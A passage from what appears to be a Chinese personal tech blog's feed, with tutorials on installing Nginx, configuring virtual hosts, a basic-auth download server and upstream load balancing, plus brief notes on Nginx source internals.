class="line">pcp-pmda-nginx.x86_64                                6.2.0-5.el9_4                       appstream</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="通过yum安装nginx">通过yum安装Nginx</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y nginx</span><br></pre></td></tr></table></figure>
<p>安装成功后，查看Nginx版本信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nginx -v</span><br><span class="line">nginx version: nginx/1.20.1</span><br></pre></td></tr></table></figure>
<h2><span id="查看nginx的安装路径主程序配置文件的路径">查看Nginx的安装路径(主程序，配置文件的路径)</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rpm -qpl nginx</span><br><span class="line">/usr/bin/nginx-upgrade</span><br><span class="line">/usr/lib/systemd/system/nginx.service</span><br><span class="line">/usr/share/man/man8/nginx.8.gz</span><br><span class="line">/usr/share/nginx/html/index.html</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"># rpm -ql nginx-core</span><br><span class="line">/etc/logrotate.d/nginx</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/lib64/nginx/modules</span><br><span class="line">/usr/sbin/nginx</span><br><span class="line">/var/lib/nginx</span><br><span class="line">/var/log/nginx</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/error.log</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ul>
<li>&#x2F;etc&#x2F;nginx&#x2F; Nginx配置文件路径</li>
<li>&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F; 通常把静态文件放这里</li>
</ul>
<h2><span id="运行nginx">运行Nginx</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld 	# 先关闭防火墙</span><br><span class="line">systemctl start nginx		# 启动Nginx</span><br><span class="line"></span><br><span class="line">ss -antp | grep nginx		# 查看80端口已经LISTEN</span><br><span class="line">LISTEN    0      511           0.0.0.0:80           0.0.0.0:*</span><br><span class="line">LISTEN    0      511              [::]:80              [::]:*</span><br></pre></td></tr></table></figure>
<h2><span id="测试">测试</span></h2><p><code>curl http://&#123;your_ip&#125;:80</code> 返回200 OK, 或者你在浏览器里访问IP能看到Nginx页面说明成功</p>
<h2><span id="参考">参考</span></h2><p><a href="https://www.nginx.org.cn/article/detail/545">https://www.nginx.org.cn/article/detail/545</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx源码解读</title>
    <url>/2024/1114195846.html</url>
    <content><![CDATA[<p>Nginx 1.20.1</p>
<ul>
<li>Nginx.conf如何解析</li>
<li>多进程网络连接</li>
<li>内存池实现</li>
<li>线程池源码</li>
<li>进程间通信共享内存的实现</li>
</ul>
<span id="more"></span>
<p>经典问题:</p>
<ul>
<li>多进程如何实现</li>
<li>惊群</li>
<li>内存池</li>
<li>多个进程锁</li>
</ul>
<p><a href="https://www.bilibili.com/video/BV1oi421m7Qa?spm_id_from=333.788.videopod.episodes&vd_source=d8559c2d87607be86810cd806158bb86">https://www.bilibili.com/video/BV1oi421m7Qa?spm_id_from=333.788.videopod.episodes&amp;vd_source=d8559c2d87607be86810cd806158bb86</a><br><a href="https://102no.com/2021/06/07/10-nginx-learn-books/#%E3%80%8ANginx%E5%BC%80%E5%8F%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B">https://102no.com/2021/06/07/10-nginx-learn-books/#%E3%80%8ANginx%E5%BC%80%E5%8F%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B</a><br>(Nginx&#x2F;Redis&#x2F;kernel)</p>
<h1><span id="ngx_modulesc文件定义ngx_modules数组">ngx_modules.c文件定义ngx_modules数组</span></h1><h1><span id="nginxconf解析">Nginx.conf解析</span></h1><p>ngx_set_worker_processes</p>
<p>单独用len计长度, 便于内存池管理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    size_t      len;</span><br><span class="line">    u_char     *data;</span><br><span class="line">&#125; ngx_str_t;</span><br></pre></td></tr></table></figure>

<p>多个进程监听不同的端口怎么做的?</p>
<p>ngx_http_optimize_servers<br>ngx_http_init_listening<br>ngx_http_add_listening<br>ngx_create_listening</p>
<h1><span id="内存池">内存池</span></h1><p>Nginx用在哪里?<br>连接建立, 为fd分配内存池</p>
<p>内存池实现ngx_calloc.c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct ngx_pool_large_s  ngx_pool_large_t;</span><br><span class="line"></span><br><span class="line">struct ngx_pool_large_s &#123;</span><br><span class="line">    ngx_pool_large_t     *next;</span><br><span class="line">    void                 *alloc;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">单链表</span><br><span class="line">(alloc | next) -&gt; (alloc | next) -&gt; (alloc | next)</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    u_char               *last;				// 当前内存可分配的地址</span><br><span class="line">    u_char               *end;				// 当前内存结尾地址</span><br><span class="line">    ngx_pool_t           *next;				// 指向下一块内存的结构体</span><br><span class="line">    ngx_uint_t            failed;			// 记录分配失败次数</span><br><span class="line">&#125; ngx_pool_data_t;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    u_char               *last;</span><br><span class="line">    u_char               *end;</span><br><span class="line">    ngx_pool_t           *next;</span><br><span class="line">    ngx_uint_t            failed;</span><br><span class="line">&#125; ngx_pool_data_t;</span><br><span class="line"></span><br><span class="line">struct ngx_pool_s &#123;</span><br><span class="line">    ngx_pool_data_t       d;</span><br><span class="line">    size_t                max;</span><br><span class="line">    ngx_pool_t           *current;</span><br><span class="line">    ngx_chain_t          *chain;</span><br><span class="line">    ngx_pool_large_t     *large;</span><br><span class="line">    ngx_pool_cleanup_t   *cleanup;</span><br><span class="line">    ngx_log_t            *log;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h2><span id="问题-c10k问题如何解决的">问题: C10K问题如何解决的</span></h2><p>C10K问题: 如何在一台物理机支持1万个并发连接<br>IO 多路复用(epoll)</p>
<p>问题: Master和Worker进程分别是什么,<br>master 加载配置文件，管理子进程<br>worker 每个worker进程可同时处理多个请求</p>
<p>问题: 多个worker进程如何监听同一个端口的, 哪一个worker处理请求(惊群) ?<br>fork<br>每个进程epoll_wait -&gt; accept， 但只有一个进程accept执行成功</p>
<p>只让一个进程的fd加到epoll里<br>atomic lock; (共享内存)</p>
<p>问题: 多个server怎么启动的，端口LISTEN在哪?</p>
]]></content>
      <categories>
        <category>draft</category>
      </categories>
      <tags>
        <tag>draft</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx虚拟主机配置</title>
    <url>/2024/1116173059.html</url>
    <content><![CDATA[<h2><span id="什么是虚拟主机">什么是虚拟主机</span></h2><p>虚拟主机是指，把一台物理主机划分为多台虚拟主机，每台虚拟主机都可以是一个独立的网站，可以有独立的域名，具有完整的服务器功能。</p>
<p>Nginx提供虚拟主机功能，使我们不必为每个网站都提供一台Nginx服务器；只需运行一组Nginx进程，就可以运行多个域名不同网站</p>
<h2><span id="配置虚拟主机的方法">配置虚拟主机的方法</span></h2><p>Nginx配置虚拟主机的方式有三种:</p>
<span id="more"></span>
<ul>
<li>基于域名的虚拟主机(不同的域名，相同的IP，这种方式用的最多)</li>
<li>基于端口的虚拟主机(通过不同的端口号区分虚拟主机)</li>
<li>基于IP的虚拟主机 (不同域名, 不同的IP, 需要多个网络接口, 用的比较少，不演示)</li>
</ul>
<h2><span id="基于域名配置虚拟主机">基于域名配置虚拟主机</span></h2><p>例: 在一台Linux服务器中配置两台Nginx虚拟主机，实现如下要求:</p>
<ul>
<li>访问域名vod.petertest.com -&gt; 返回服务器的&#x2F;www&#x2F;vod路径下的页面</li>
<li>访问域名aud.petertest.com -&gt; 返回服务器的&#x2F;www&#x2F;aud路径下的页面</li>
</ul>
<h3><span id="修改客户机的hosts文件添加服务器ip和域名的映射">修改客户机的HOSTS文件，添加服务器IP和域名的映射</span></h3><p>修改&#x2F;etc&#x2F;hosts文件，添加如下两行: (192.168.52.200是我的Linux服务器IP)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.200 vod.petertest.com</span><br><span class="line">192.168.52.200 aud.petertest.com</span><br></pre></td></tr></table></figure>

<h3><span id="为两个虚拟主机准备静态页面">为两个虚拟主机准备静态页面</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /www/vod /www/aud</span><br><span class="line">echo &quot;welcome to vod site&quot; &gt; /www/vod/index.html</span><br><span class="line">echo &quot;welcome to aud site&quot; &gt; /www/aud/index.html</span><br></pre></td></tr></table></figure>

<h3><span id="修改nginxconf的server配置块">修改Nginx.conf的server配置块</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  # 虚拟主机1(vod.petertest.com)</span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  vod.petertest.com; # 设置域名</span><br><span class="line">access_log   vod_petertest_access.log; # 设置日志路径</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    root /www/vod;</span><br><span class="line">   &#125;</span><br><span class="line">      error_page 500 502 503 504 /50x.html;</span><br><span class="line">      location = /50x.html &#123;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  # 虚拟主机2(aud.petertest.com)</span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  aud.petertest.com; # 设置域名</span><br><span class="line">access_log   aud_petertest_access.log; # 设置日志路径</span><br><span class="line">      root         /www/aud; # 访问/www/vod下的页面</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line">location / &#123;</span><br><span class="line">    root /www/aud;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      error_page 500 502 503 504 /50x.html;</span><br><span class="line">      location = /50x.html &#123;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3><span id="重新加载nginx配置测试">重新加载Nginx配置，测试</span></h3><p>使用<code>nginx -t</code>检查配置文件是否正确，使用<code>nginx -s reload</code>重新加载配置，测试结果如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl vod.petertest.com</span><br><span class="line">welcome to vod site</span><br><span class="line"># curl aud.petertest.com</span><br><span class="line">welcome to aud site</span><br></pre></td></tr></table></figure>
<p>注: 如遇到Nginx报错: bind() to 0.0.0.0:8088 failed (13: Permission denied), 参考: <a href="https://pcj600.github.io/2024/1110141108.html">link</a></p>
<h2><span id="基于端口配置虚拟主机">基于端口配置虚拟主机</span></h2><p>例: 在一台Linux服务器中配置两台Nginx虚拟主机，实现如下要求:</p>
<ul>
<li>访问域名vod.petertest.com:80 -&gt; 返回服务器的&#x2F;www&#x2F;vod路径下的页面</li>
<li>访问域名vod.petertest.com:88 -&gt; 返回服务器的&#x2F;www&#x2F;aud路径下的页面</li>
</ul>
<h3><span id="修改nginxconf的server配置块">修改Nginx.conf的server配置块</span></h3><p>配置方法和”基于域名配置虚拟主机”类似，只需要修改server_name和listen的端口号即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  # 虚拟主机1(vod.petertest.com)</span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  vod.petertest.com; # 设置域名</span><br><span class="line">access_log   vod_petertest_access.log;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    root /www/vod;</span><br><span class="line">   &#125;</span><br><span class="line">      error_page 500 502 503 504 /50x.html;</span><br><span class="line">      location = /50x.html &#123;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  # 虚拟主机2(aud.petertest.com)</span><br><span class="line">  server &#123;</span><br><span class="line">      listen       88; # 设置端口</span><br><span class="line">      server_name  vod.petertest.com; # 设置域名</span><br><span class="line">access_log   aud_petertest_access.log;</span><br><span class="line">      root         /www/aud;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line">location / &#123;</span><br><span class="line">    root /www/aud;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      error_page 500 502 503 504 /50x.html;</span><br><span class="line">      location = /50x.html &#123;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3><span id="测试">测试</span></h3><p>使用<code>nginx -t</code>检查配置文件是否正确，使用<code>nginx -s reload</code>重新加载配置，测试结果如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl vod.petertest.com</span><br><span class="line">welcome to vod site</span><br><span class="line"># curl vod.petertest.com:88</span><br><span class="line">welcome to aud site</span><br></pre></td></tr></table></figure>

<h2><span id="nginx-server_name的其他配置案例">Nginx server_name的其他配置案例</span></h2><h3><span id="同一个server_name匹配多个域名">同一个server_name匹配多个域名</span></h3><p>通过不同的域名访问相同的页面, 实现如下效果：</p>
<ul>
<li>访问vod.petertest.com -&gt; 返回&#x2F;vww&#x2F;vod 页面</li>
<li>访问vod1.petertest.com -&gt; 也返回&#x2F;www&#x2F;vod 页面</li>
</ul>
<p>方法：修改nginx.conf的server配置块, 一个server_name中配置多个域名，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  vod.petertest.com vod1.petertest.com;	# 在一个server中配置多个servername</span><br><span class="line">      root         /www/vod;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>测试结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl vod.petertest.com</span><br><span class="line">this is vod web site</span><br><span class="line"># curl vod1.petertest.com</span><br><span class="line">this is vod web site</span><br></pre></td></tr></table></figure>
<h3><span id="通配符匹配多个server_name">通配符匹配多个server_name</span></h3><p>例如，访问<code>.petertest.com</code>结尾的域名，返回&#x2F;www&#x2F;vod页面</p>
<p>Nginx.conf配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  *.petertest.com;	# 通配符匹配</span><br><span class="line">      root         /www/vod;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3><span id="通配符结束匹配">通配符结束匹配</span></h3><p>实现如下效果：</p>
<ul>
<li>访问vod.petertest.com -&gt; 返回&#x2F;vww&#x2F;vod 页面</li>
<li>访问vod.petertest.XXX -&gt; 返回&#x2F;www&#x2F;aud 页面</li>
</ul>
<p>Nginx.conf配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  vod.petertest.com;</span><br><span class="line">      root         /www/www;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  vod.petertest.*;			# 通配符结束匹配</span><br><span class="line">      root         /www/aud;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>测试结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl vod.petertest.com</span><br><span class="line">this is www web site</span><br><span class="line"># curl vod.petertest.io</span><br><span class="line">this is aud web site</span><br></pre></td></tr></table></figure>
<h3><span id="正则匹配">正则匹配</span></h3><p>实现如下效果：</p>
<ul>
<li>访问vod.petertest.com -&gt; 返回&#x2F;vww&#x2F;vod 页面</li>
<li>访问123.petertest.com -&gt; 返回&#x2F;www&#x2F;aud 页面</li>
</ul>
<p>Nginx.conf配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  vod.petertest.com;</span><br><span class="line">      root         /www/www;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  ~^[0-9]+\.petertest\.com$;			# 正则匹配</span><br><span class="line">      root         /www/vod;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>测试结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl vod.petertest.com</span><br><span class="line">this is www web site</span><br><span class="line"># curl 123.petertest.com</span><br><span class="line">this is aud web site</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://juejin.cn/post/7096443628326748174">手把手教你配置Nginx的虚拟主机</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx文件下载服务器搭建</title>
    <url>/2024/1117153133.html</url>
    <content><![CDATA[<h1><span id="nginx文件下载服务器搭建">Nginx文件下载服务器搭建</span></h1><p>80端口启动下载服务器, 下载<code>/var/www/downloads</code>目录下的文件，<code>nginx.conf</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location /downloads/ &#123;</span><br><span class="line">        root /var/www/downloads;</span><br><span class="line">        autoindex on; # 显示目录</span><br><span class="line">        autoindex_localtime on;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>浏览器中访问，可以查到文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.52.200/</span><br><span class="line">Index of /</span><br><span class="line">../</span><br><span class="line">1.txt     17-Nov-2024 14:52      0</span><br><span class="line">2.txt     13-Nov-2024 21:44      0</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2><span id="添加登录认证">添加登录认证</span></h2><p>有时我们需要对用户身份进行认证。这里采用basic认证, 方法如下:<br><br>先生成密码文件，用户名admin, 密码123456</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -n &quot;admin:&quot; &gt; /etc/nginx/conf.d/.nginx_http_passwd</span><br><span class="line">openssl passwd &gt;&gt; /etc/nginx/conf.d/.nginx_http_passwd</span><br><span class="line"># 输入密码123456</span><br></pre></td></tr></table></figure>
<p>查看密码文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/nginx/conf.d/.nginx_http_passwd</span><br><span class="line">admin:$1$6ptGV8Fm$781jZKRgxV8wB.HtyTSdk.</span><br></pre></td></tr></table></figure>
<p>修改nginx.conf，添加auth配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line"></span><br><span class="line">    auth_basic &quot;Restricted site&quot;;</span><br><span class="line">    auth_basic_user_file /etc/nginx/conf.d/.nginx_http_passwd;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重启Nginx，通过浏览器测试，此时会要求用户输入用户名和密码。</p>
<h2><span id="参考">参考</span></h2><p><a href="https://zhuleichina.github.io/2019/12/12/%E5%9F%BA%E4%BA%8Enginx%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%9C%8D%E5%8A%A1%E5%99%A8.html">https://zhuleichina.github.io/2019/12/12/%E5%9F%BA%E4%BA%8Enginx%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%9C%8D%E5%8A%A1%E5%99%A8.html</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx负载均衡示例</title>
    <url>/2024/1117165553.html</url>
    <content><![CDATA[<h1><span id="什么是负载均衡">什么是负载均衡</span></h1><p>负载均衡是一种网络流量分配技术, 其核心目的是将大量网络请求均匀分配到多个服务器，提高网络服务的可靠性。有如下作用：</p>
<ul>
<li>避免单点故障，提高可用性</li>
<li>灵活的水平扩展，通过增加或减少服务器数量，提升扩展性；可以用多台便宜机器代替一台高性能机器，省钱</li>
<li>优化资源利用率，减少响应时间，提升用户体验</li>
<li>负载均衡器上支持过滤，阻挡不安全的请求，提高系统安全性<span id="more"></span></li>
</ul>
<h1><span id="正向代理和反向代理">正向代理和反向代理</span></h1><p>这里给出通俗解释，详细的定义可以查Google</p>
<ul>
<li>正向代理：国内你无法访问Google，必须用梯子，你用的这个梯子就是正向代理。</li>
<li>反向代理：Nginx代理了真实服务器，去和客户端交互; 对于客户端来说, 真实服务器被Nginx隐藏，这个Nginx就是反向代理。</li>
</ul>
<h1><span id="负载均衡示例">负载均衡示例</span></h1><p>Nginx负载均衡流程图如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                                   -&gt; web服务器1</span><br><span class="line">                                                 /</span><br><span class="line">客户端 --请求--&gt; Nginx(负载均衡器) --proxy_pass--  -&gt; web服务器2</span><br><span class="line">                                                 \</span><br><span class="line">                                                   -&gt; web服务器3</span><br></pre></td></tr></table></figure>
<p>Nginx负载均衡策略有很多，这里演示默认的Round-Robin轮询策略</p>
<p>先准备三台RHEL9 VM机器，每台机器都安装Nginx，用于后面的演示:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.200 Nginx1 </span><br><span class="line">192.168.52.201 Nginx2</span><br><span class="line">192.168.52.202 Nginx3</span><br></pre></td></tr></table></figure>

<h2><span id="示例1-最简单的proxy_pass配置">示例1: 最简单的proxy_pass配置</span></h2><p>测试机器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.200 Nginx1 </span><br><span class="line">192.168.52.201 Nginx2</span><br></pre></td></tr></table></figure>
<p>需求: Nginx1作为负载均衡器, 客户请求Nginx1, Nginx1把所有请求转发到Nginx2</p>
<p><strong>具体步骤</strong><br>先修改Nginx1的<code>nginx.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  _;</span><br><span class="line">      include /etc/nginx/default.d/*.conf;</span><br><span class="line">      location / &#123;</span><br><span class="line">          proxy_pass http://192.168.52.201;	# 配置proxy_pass</span><br><span class="line">      &#125;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>再修改Nginx2的<code>nginx.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  _;</span><br><span class="line">    root         /var/www/html;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为Nginx2添加主页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /var/www/html</span><br><span class="line">cat &quot;Welcome to Nginx2&quot; &gt; /var/www/html/index.html</span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br></pre></td></tr></table></figure>

<h2><span id="示例2-配置多个proxypass">示例2: 配置多个proxypass</span></h2><p>测试机器:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.200 Nginx1 </span><br><span class="line">192.168.52.201 Nginx2</span><br><span class="line">192.168.52.202 Nginx3</span><br></pre></td></tr></table></figure>
<p>需求: Nginx1作为负载均衡器, 客户请求Nginx1, Nginx1通过Round-Robin轮询策略把请求转发给Nginx2, Nginx3</p>
<p><strong>具体方法</strong><br>修改Nginx1的配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加upstream配置块，和server块同级</span><br><span class="line">upstream my_servers&#123;</span><br><span class="line">	server 192.168.52.201:80;</span><br><span class="line">	server 192.168.52.202:80;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  _;</span><br><span class="line">    location / &#123;</span><br><span class="line">		proxy_pass http://my_servers;	# 配置proxy_pass</span><br><span class="line">	&#125;</span><br><span class="line">    # Load configuration files for the default server block.</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to Nginx3</span><br></pre></td></tr></table></figure>

<h2><span id="示例3-设置权重策略weight">示例3: 设置权重策略(weight)</span></h2><p>需求:</p>
<ul>
<li>Nginx1作为负载均衡器, 客户请求Nginx1, Nginx1通过Round-Robin轮询策略把请求转发给Nginx2, Nginx3; </li>
<li>给Nginx2设置更大的权重, 设置为Nginx3的四倍</li>
</ul>
<p><strong>具体方法</strong><br>修改Nginx1的配置文件，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream my_servers &#123;</span><br><span class="line">    server 192.168.52.201:80 weight=4;</span><br><span class="line">    server 192.168.52.202:80 weight=1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to Nginx3</span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br></pre></td></tr></table></figure>
<p>平均下来，每5次请求有4次转发给Nginx2, 1次转发给Nginx3, 与我们的权重设置吻合</p>
<h2><span id="示例4-让某台服务器下线down">示例4: 让某台服务器下线(down)</span></h2><p>down将服务器标记为不可用，该服务器不参与负载均衡<br></p>
<p>需求: 对Nginx2进行停机维护，标记为不可用</p>
<p><strong>具体方法</strong><br>修改Nginx1的配置文件，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream my_servers &#123;</span><br><span class="line">    server 192.168.52.201:80 weight=4 down;</span><br><span class="line">    server 192.168.52.202:80 weight=1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试: (Nginx2下线, 所有请求只转发到了Nginx3)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to Nginx3</span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to Nginx3</span><br></pre></td></tr></table></figure>

<h2><span id="示例5-备用服务器backup">示例5: 备用服务器(backup)</span></h2><p>backup将该服务器标记为备份服务器。仅当其他服务器都出现故障时，Nginx才会把请求转到这台备用服务器</p>
<p>需求: 把Nginx3标记为备份服务器</p>
<p><strong>具体方法</strong><br>修改Nginx1的配置文件，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream my_servers &#123;</span><br><span class="line">    server 192.168.52.201:80;</span><br><span class="line">    server 192.168.52.202:80 backup;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试, 设置Nginx3为backup后, Nginx1把请求只转发到了Nginx2；此时我手动stop Nginx2, 继续请求，Nginx1把请求都转发到了Nginx3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to nginx2</span><br><span class="line"></span><br><span class="line"># 此时手动stop Nginx2 </span><br><span class="line"># curl 192.168.52.200:80</span><br><span class="line">Welcome to Nginx3</span><br></pre></td></tr></table></figure>

<h3><span id="其他的负载均衡策略">其他的负载均衡策略</span></h3><table>
<thead>
<tr>
<th>策略</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ip_hash</td>
<td>根据客户端IP地址转发到同一台服务器，可以保持会话</td>
</tr>
<tr>
<td>least_conn</td>
<td>最少连接访问</td>
</tr>
<tr>
<td>url_hash</td>
<td>根据URL分配，需三方插件</td>
</tr>
<tr>
<td>fair</td>
<td>根据后端服务器响应时间选择，需三方插件</td>
</tr>
</tbody></table>
<p>说明:  </p>
<ul>
<li>单纯使用RR算法存在一个问题：不能维持Session</li>
<li>ip_hash可以将某个客户IP的请求通过哈希算法固定到同一台服务器，实现Session共享；但是实际场景中，客户的IP经常会改变，所以单纯用ip_hash的做法不常见</li>
<li>least_conn把请求发给连接数较少的服务器，这个单纯用也不常见; 对于不同带宽配置的服务器, 单纯用least_conn策略不合适</li>
<li>fair根据后端服务器响应时间选择, 会造成网络倾斜，单纯用fair也不多见</li>
<li>url_hash也不常用，不能做到维持会话。比如客户注册和客户登录的URL是不同的，通过哈希算法会转发到不同的服务器</li>
</ul>
